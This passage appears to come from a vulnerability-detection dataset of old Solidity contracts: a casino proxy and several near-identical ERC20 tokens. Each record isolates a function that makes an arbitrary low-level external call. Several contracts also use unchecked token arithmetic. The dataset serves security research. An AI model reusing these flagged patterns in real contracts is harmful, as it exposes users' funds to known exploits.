if(closeAt > 0) closeAt = now + 30 days;\n _;\n }\n}\ncontract casinoProxy is casinoBank{\n mapping(address => bool) public authorized;\n mapping(address => mapping(address => bool)) public authorizedByUser;\n mapping(address => mapping(address => uint8)) public lockedByUser;\n address[] public casinoGames;\n mapping(address => uint) public count;\n modifier onlyAuthorized {\n require(authorized[msg.sender]);\n _;\n }\n modifier onlyCasinoGames {\n bool isCasino;\n for (uint i = 0; i < casinoGames.length; i++){\n if(msg.sender == casinoGames[i]){\n isCasino = true;\n break;\n }\n }\n require(isCasino);\n _;\n }\n function casinoProxy(address authorizedAddress, address blackjackAddress, address tokenContract) casinoBank(tokenContract) public{\n authorized[authorizedAddress] = true;\n casinoGames.push(blackjackAddress);\n }\n function shift(address player, uint numTokens, bool isReceiver) public onlyCasinoGames{\n require(authorizedByUser[player][msg.sender]);\n var gasCost = avgGas[msg.sender] * gasPrice;\n if(isReceiver){\n numTokens = safeSub(numTokens, gasCost);\n balanceOf[player] = safeAdd(balanceOf[player], numTokens);\n playerBalance = safeAdd(playerBalance, numTokens);\n }\n else{\n numTokens = safeAdd(numTokens, gasCost);\n balanceOf[player] = safeSub(balanceOf[player], numTokens);\n playerBalance = safeSub(playerBalance, numTokens);\n }\n }\n function withdrawFor(address receiver, uint amount, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized keepAlive{\n uint gasCost = msg.gas/1000 * gasPrice;\n var player = ecrecover(keccak256(receiver, amount, count[receiver]), v, r, s);\n count[receiver]++;\n uint value = safeAdd(safeMul(amount,10000), gasCost);\n balanceOf[player] = safeSub(balanceOf[player], value);\n playerBalance = safeSub(playerBalance, value);\n assert(edg.transfer(receiver, amount));\n Withdrawal(player, receiver, amount);\n }\n function setGameAddress(uint8 game, address newAddress) public onlyOwner{\n if(game<casinoGames.length) casinoGames[game] = newAddress;\n else casinoGames.push(newAddress);\n }\n function authorize(address addr) public onlyOwner{\n authorized[addr] = true;\n }\n function deauthorize(address addr) public onlyOwner{\n authorized[addr] = false;\n }\n function authorizeCasino(address playerAddress, address casinoAddress, uint8 v, bytes32 r, bytes32 s) public{\n address player = ecrecover(keccak256(casinoAddress,lockedByUser[playerAddress][casinoAddress],true), v, r, s);\n require(player == playerAddress);\n authorizedByUser[player][casinoAddress] = true;\n }\n function deauthorizeCasino(address playerAddress, address casinoAddress, uint8 v, bytes32 r, bytes32 s) public{\n address player = ecrecover(keccak256(casinoAddress,lockedByUser[playerAddress][casinoAddress],false), v, r, s);\n require(player == playerAddress);\n authorizedByUser[player][casinoAddress] = false;\n lockedByUser[player][casinoAddress]++;\n }\n function setGasPrice(uint8 price) public onlyOwner{\n gasPrice = price;\n }\n function setAvgGas(uint8 game, uint16 gas) public onlyOwner{\n avgGas[casinoGames[game]] = gas;\n }\n function move(uint8 game, bytes data, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized isAlive{\n require(game < casinoGames.length);\n var player = ecrecover(keccak256(data), v, r, s);\n require(withdrawAfter[player] == 0 || now<withdrawAfter[player]);\n assert(checkAddress(player, data));\n assert(casinoGames[game].call(data));\n }\n function checkAddress(address player, bytes data) constant internal returns(bool){\n bytes memory ba;\n assembly {\n let m := mload(0x40)\n mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, player))\n mstore(0x40, add(m, 52))\n ba := m\n }\n for(uint8 i = 0; i < 20; i++){\n if(data[16+i]!=ba[i]) return false;\n }\n return true;\n }\n}",
  "extract_feature": [
    "function move(uint8 game, bytes data, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized isAlive{\nrequire(game < casinoGames.length);\nvar player = ecrecover(keccak256(data), v, r, s);\nrequire(withdrawAfter[player] == 0 || now<withdrawAfter[player]);\nassert(checkAddress(player, data));\nassert(casinoGames[game].call(data));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1512"
  },
  "filename": "33675.sol",
  "content": "pragma solidity ^0.4.8;\ncontract ABTokenBase {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract ABStandardToken is ABTokenBase {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract ABToken is ABStandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1.1';\n function ABToken() public {\n totalSupply = 990000000;\n balances[msg.sender] = totalSupply;\n decimals = 4;\n name = \"Pablo Token\";\n symbol = \"PAB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1513"
  },
  "filename": "33679.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EB2XToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EB2XToken(\n ) {\n balances[msg.sender] = 2100000000000000;\n totalSupply = 2100000000000000;\n name = \"eB2X\";\n decimals = 8;\n symbol = \"EB2X\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1514"
  },
  "filename": "33684.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract AditusToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'A1.0';\n function AditusToken(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Aditus\";\n decimals = 2;\n symbol = \"ADI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1515"
  },
  "filename": "33687.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract AditusToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'A1.0';\n function AditusToken(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Aditus\";\n decimals = 18;\n symbol = \"ADI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1516"
  },
  "filename": "33690.sol",
  "content": "pragma solidity ^0.4.15;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERW is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERW(\n ) {\n balances[msg.sender] = 13000000000000000000000000;\n totalSupply = 13000000000000000000000000;\n name = \"Ethereum Reward Token\";\n decimals = 18;\n symbol = \"ERW\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1517"
  },
  "filename": "33691.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ThatCryptoShow is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ThatCryptoShow(\n ) {\n balances[msg.sender] = 4000000000000000000000000;\n totalSupply = 4000000000000000000000000;\n name = \"ThatCryptoShow\";\n decimals = 18;\n symbol = \"TCS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1518"
  },
  "filename": "33694.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract UquidCoin is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is UquidCoin {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 40000000000000000000000000;\n totalSupply = 40000000000000000000000000;\n name = \"Uquid Coin\";\n decimals = 18;\n symbol = \"UQC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1519"
  },
  "filename": "33706.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract catnip is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function catnip(\n ) {\n balances[msg.sender] = 100000;\n totalSupply = 100000;\n name = \"catnip\";\n decimals = 3;\n symbol = \"MEOWS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb151a"
  },
  "filename": "33708.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"Litecoin Classic\";\n decimals = 18;\n symbol = \"LCC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb151b"
  },
  "filename": "33723.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract NashvilleBeerToken is HumanStandardToken {\n address public constant RECIPIENT = 0xB1384DfE8ac77a700F460C94352bdD47Dc0327eF;\n bytes32[] public claimedList;\n mapping(address => bytes32) names;\n uint256 public maxSupply;\n event LogBeerBought(uint date, address owner);\n function NashvilleBeerToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n uint256 _maxSupply\n )\n HumanStandardToken(_initialAmount, _tokenName, _decimalUnits, _tokenSymbol)\n {\n maxSupply = _maxSupply;\n }\n function registerName(bytes32 _name) {\n 